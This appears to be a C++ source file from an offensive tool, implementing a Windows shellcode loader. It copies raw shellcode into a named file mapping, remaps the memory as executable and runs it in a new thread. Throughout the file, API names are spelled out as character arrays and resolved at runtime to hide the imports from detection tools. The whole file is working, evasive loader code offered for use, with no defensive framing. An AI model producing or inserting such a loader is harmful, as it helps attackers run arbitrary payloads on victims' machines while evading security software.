#include "Loader.h"
#include <AclAPI.h>
#include <iostream>

Loader::Loader(const Helper& helper)
{
	this->helper = helper;
}

void Loader::FileMappingLoadShellcode(unsigned char *rawShellcode, int rawShellcodeLength)
{
	// Checking if private namespace is already open
	if (!helper.IsPrivateNameSpaceOpen())
	{
		helper.CreateNewPrivateNameSpace();
	}

	const std::wstring fMappingName = helper.pNameSpaceName + L"\\" + helper.GenerateRandomWideString();

	// Creating file mapping and loading it into current process memory
	constexpr unsigned char sCreateFileMapping[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'M', 'a', 'p', 'p', 'i', 'n', 'g', 'W', 0x0 };
	typedef HANDLE(WINAPI* CreateFileMapping_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCWSTR);
	const ResolvedObject<CreateFileMapping_t> createFileMapping =
		helper.ResolveFunction(sCreateFileMapping, static_cast<CreateFileMapping_t>(nullptr));

	HANDLE fMapping = 
		createFileMapping.call(INVALID_HANDLE_VALUE, nullptr, PAGE_EXECUTE_READWRITE, 0, 1 << 12, fMappingName.c_str());

	constexpr unsigned char sMapViewOfFile[] = { 'M', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'F', 'i', 'l', 'e', 0x0 };
	typedef LPVOID(WINAPI* MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
	const ResolvedObject<MapViewOfFile_t> mapViewOfFile =
		helper.ResolveFunction(sMapViewOfFile, static_cast<MapViewOfFile_t>(nullptr));

	void* buffer = mapViewOfFile.call(fMapping, FILE_MAP_WRITE, 0, 0, 0);

	// Moving shellcode into file mapping
	constexpr unsigned char sRtlMoveMemory[] = { 'R', 't', 'l', 'M', 'o', 'v', 'e', 'M', 'e', 'm', 'o', 'r', 'y', 0x0 };
	typedef VOID(WINAPI* RtlMoveMemory_t)(VOID*, VOID*, SIZE_T);
	const ResolvedObject<RtlMoveMemory_t> rtlMoveMemory =
		helper.ResolveFunction(sRtlMoveMemory, static_cast<RtlMoveMemory_t>(nullptr));

	rtlMoveMemory.call(buffer, rawShellcode, rawShellcodeLength);

	// Dropping current memory pages and requesting them again with execute privileges
	constexpr unsigned char sUnmapViewOfFile[] = { 'U', 'n', 'm', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'F', 'i', 'l', 'e', 0x0 };
	typedef BOOL(WINAPI* UnmapViewOfFile_t)(LPCVOID);
	const ResolvedObject<UnmapViewOfFile_t> unmapViewOfFile =
		helper.ResolveFunction(sUnmapViewOfFile, static_cast<UnmapViewOfFile_t>(nullptr));

	unmapViewOfFile.call(buffer);

	buffer = mapViewOfFile.call(fMapping, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0);

	// Launching new thread from mapped memory region, waiting for it to finish
	constexpr unsigned char sCreateThread[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0x0 };
	typedef HANDLE(WINAPI* CreateThread_t)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
	const ResolvedObject<CreateThread_t> createThread =
		helper.ResolveFunction(sCreateThread, static_cast<CreateThread_t>(nullptr));

	HANDLE th = createThread.call(nullptr, 0, LPTHREAD_START_ROUTINE(buffer), nullptr, 0, nullptr);

	constexpr unsigned char sWaitForSingleObject[] = { 'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', 0x0 };
	typedef DWORD(WINAPI* WaitForSingleObject_t)(HANDLE, DWORD);
	const ResolvedObject<WaitForSingleObject_t> waitForSingleObject =
		helper.ResolveFunction(sWaitForSingleObject, static_cast<WaitForSingleObject_t>(nullptr));
	waitForSingleObject.call(th, -1);
}

